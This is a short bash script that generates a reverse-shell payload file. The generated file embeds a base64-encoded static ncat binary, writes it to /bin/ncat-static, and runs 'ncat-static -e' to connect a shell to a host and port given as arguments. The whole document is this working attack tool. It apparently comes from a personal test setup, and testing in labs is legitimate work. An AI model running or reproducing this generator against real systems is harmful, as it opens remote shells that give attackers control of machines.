#!/bin/bash

if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <shell> <host> <port>"
    exit 1
fi

NCAT=/home/matus/ncat-static
OUTPUT=/home/matus/testroot/reverseshell
echo -n 'cp -p '$1' /bin/ncat-static; echo "'`base64 $NCAT`'" | base64 -di > /bin/ncat-static; ncat-static -e '$1' '$2' '$3' ' > $OUTPUT
chmod +x $OUTPUT
